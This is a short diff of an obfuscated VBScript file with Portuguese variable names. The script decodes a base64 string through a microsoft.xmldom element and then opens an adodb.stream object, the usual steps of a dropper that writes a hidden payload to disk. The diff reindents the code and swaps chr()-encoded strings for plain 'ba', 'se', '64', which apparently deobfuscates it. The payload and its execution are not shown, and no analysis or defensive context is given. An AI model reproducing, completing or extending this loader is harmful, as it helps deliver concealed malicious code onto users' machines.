@@ -1,7 +1,7 @@
 Class classe1
     Function funcao1(parametro)
-	set o = CreateObject("microsoft.xmldom").createElement(parametro(1))
-	o.DataType = "bin.base64"
+	    set o = CreateObject("microsoft.xmldom").createElement(parametro(1))
+	    o.DataType = "bin.base64"
         o.Text = parametro(0)
         If (parametro(3)(0) & parametro(3)(1)) = ("ba" & "se") Then
             funcao1 = Array(o.NodeTypedValue)
@@ -22,7 +22,7 @@ End Class
 Set objClasse1 = New classe1
 variavel1 = objClasse1.getInfo("labito")
 variavel2 = Replace(variavel1(0), variavel1(1), variavel1(2))
-variavel1 = Array(variavel2, "ktc", 0, Array(chr(98) & chr(97), chr(115) & chr(101), chr(54) & chr(52)))
+variavel1 = Array(variavel2, "ktc", 0, Array("ba", "se", "64"))
 
 variavel4 = objClasse1.funcao1(variavel1)
 adodb = CreateObject("adodb.stream")
